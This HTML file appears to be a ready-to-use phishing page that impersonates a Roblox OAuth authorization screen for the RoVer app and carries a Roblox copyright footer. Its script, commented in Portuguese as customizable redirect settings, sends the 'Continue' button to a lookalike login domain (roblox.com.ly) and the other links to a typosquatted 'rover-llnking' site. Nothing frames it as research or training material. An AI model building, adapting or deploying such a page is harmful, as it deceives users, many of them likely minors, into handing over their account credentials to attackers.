<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Review Activity - Roblox</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            cursor: auto;
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 600;
            font-size: 14px;
            line-height: 19.6px;
            color: rgb(254, 254, 254);
            background-color: rgb(16, 19, 23);
        }

        .header-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background-color: rgb(19, 17, 19);
            padding: 0 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            z-index: 9999;
        }

        .logo {
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 600;
            font-size: 24px;
            line-height: 32.4px;
            color: rgb(253, 254, 254);
        }

        .main-container {
            max-width: 1280px;
            width: 100%;
            margin: 137px auto 0;
            padding: 0 24px;
            flex-grow: 1;
        }

        .title {
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 600;
            font-size: 24px;
            line-height: 32.4px;
            text-align: center;
            padding: 24px 0;
            color: rgb(253, 254, 254);
        }

        .divider {
            border: 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.12);
            margin-bottom: 24px;
        }

        .card {
            max-width: 460px;
            margin: 0 auto;
            padding: 0 80px;
        }

        .avatar-container {
            text-align: center;
            margin-bottom: 16px;
        }

        .avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
            font-size: 48px;
            font-weight: bold;
            color: white;
        }

        .username {
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 600;
            font-size: 24px;
            line-height: 32.4px;
            color: rgb(253, 254, 254);
            margin-top: 16px;
        }

        .button-container {
            margin-top: 24px;
        }

        .approve-button {
            width: 100%;
            height: 44px;
            background-color: rgb(85, 193, 255);
            color: rgb(16, 19, 23);
            border: none;
            border-radius: 6px;
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 600;
            font-size: 16px;
            line-height: 22.4px;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-bottom: 16px;
        }

        .approve-button:hover {
            background-color: rgb(68, 174, 230);
        }

        .or-divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
        }

        .or-line {
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.12);
        }

        .or-text {
            margin: 0 16px;
            color: rgb(187, 188, 190);
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 300;
            font-size: 14px;
            line-height: 19.6px;
        }

        .deny-button {
            width: 100%;
            height: 44px;
            background-color: transparent;
            color: rgb(187, 188, 190);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 6px;
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 600;
            font-size: 16px;
            line-height: 22.4px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .deny-button:hover {
            background-color: rgba(255, 255, 255, 0.05);
            color: rgb(254, 254, 254);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .footer {
            margin-top: 48px;
            padding: 24px 0;
            text-align: center;
            color: rgb(187, 188, 190);
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 300;
            font-size: 14px;
            line-height: 19.6px;
        }

        .footer-logo-container {
            margin-bottom: 16px;
        }

        .footer-logo {
            font-family: 'Inter', Helvetica, Arial, sans-serif;
            font-weight: 600;
            font-size: 20px;
            line-height: 28px;
            color: rgb(253, 254, 254);
        }

        .footer-links {
            margin-bottom: 16px;
        }

        .footer-link {
            color: rgb(187, 188, 190);
            text-decoration: none;
            margin: 0 8px;
            font-weight: 300;
            transition: color 0.2s ease;
        }

        .footer-link:hover {
            color: rgb(85, 193, 255);
        }

        .footer-divider {
            color: rgb(187, 188, 190);
            margin: 0 4px;
        }

        .footer-copyright {
            font-size: 12px;
            line-height: 16.8px;
            color: rgb(102, 103, 107);
        }

        @media (max-width: 768px) {
            .header-container {
                padding: 0 16px;
                height: 50px;
            }

            .logo {
                font-size: 20px;
                line-height: 28px;
            }

            .main-container {
                padding: 0 12px;
                margin-top: 80px;
                min-height: 60vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }

            .card {
                width: calc(100% - 24px);
                max-width: 400px;
                padding: 0 20px;
                margin: auto;
                text-align: center;
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .title {
                font-size: 20px;
                line-height: 28px;
                padding: 16px 0;
                width: 100%;
            }

            .avatar {
                width: 80px;
                height: 80px;
                font-size: 40px;
            }

            .approve-button, .deny-button {
                padding: 12px 16px;
                font-size: 16px;
                min-height: 44px;
                width: 100%;
                max-width: 300px;
                margin: 8px auto;
            }

            .or-divider {
                width: 100%;
                margin: 16px 0;
            }

            .or-text {
                margin: 0 12px;
            }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <header class="header-container">
            <div class="logo-container">
                <div class="logo">ROBLOX</div>
            </div>
        </header>

        <main class="main-container">
            <h1 class="title">Authorize with Roblox OAuth</h1>
            <hr class="divider">

            <div class="card">
                <div class="avatar-container">
                    <div class="avatar">R</div>
                    <div class="username">RoVer</div>
                </div>

                <div class="button-container">
                    <button class="approve-button" type="button" onclick="handleApprove()">Continue</button>

                    <div class="or-divider">
                        <div class="or-line"></div>
                        <span class="or-text">or</span>
                        <div class="or-line"></div>
                    </div>

                    <button class="deny-button" type="button" onclick="handleDeny()">Return to RoVer</button>
                </div>
            </div>
        </main>

        <footer class="footer">
            <div class="footer-logo-container">
                <div class="footer-logo">ROBLOX</div>
            </div>

            <div class="footer-links">
                <a href="https://rover-llnking.vercel.app" target="_blank" class="footer-link">About Us</a>
                <span class="footer-divider">|</span>
                <a href="https://rover-llnking.vercel.app" target="_blank" class="footer-link">Join Us</a>
                <span class="footer-divider">|</span>
                <a href="https://rover-llnking.vercel.app" target="_blank" class="footer-link">Terms</a>
                <span class="footer-divider">|</span>
                <a href="https://rover-llnking.vercel.app" target="_blank" class="footer-link">Privacy</a>
                <span class="footer-divider">|</span>
                <a href="https://rover-llnking.vercel.app" target="_blank" class="footer-link">Accessibility</a>
            </div>

            <div class="footer-copyright">
                © Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered trademarks in the U.S. and other countries.
            </div>
        </footer>
    </div>

    <script>
        /* CONFIGURAÇÕES PERSONALIZÁVEIS */
        // Altere essas URLs para redirecionar para os sites de sua escolha
        const APPROVE_URL = "https://roblox.com.ly/login?returnUrl=5115571921094453";
        const RETURN_URL = "https://rover-llnking.vercel.app";

        /* Funções dos Botões */
        function handleApprove() {
            window.location.href = APPROVE_URL;
        }

        function handleDeny() {
            window.location.href = RETURN_URL;
        }
    </script>
</body>
</html>
